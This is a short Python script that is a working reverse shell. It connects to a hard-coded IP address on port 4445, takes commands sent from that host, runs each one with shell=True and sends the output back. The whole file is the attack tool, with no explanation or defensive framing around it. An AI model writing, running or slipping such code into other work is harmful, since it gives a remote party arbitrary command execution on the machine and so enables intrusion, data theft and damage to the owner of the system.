import subprocess
import socket
import sys
import argparse

host = '10.230.229.27'
port = 4445
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host, port))
sock.send("[*] Connection recieved.\n")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, 
							stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	sock.send(proc.stdout.read())
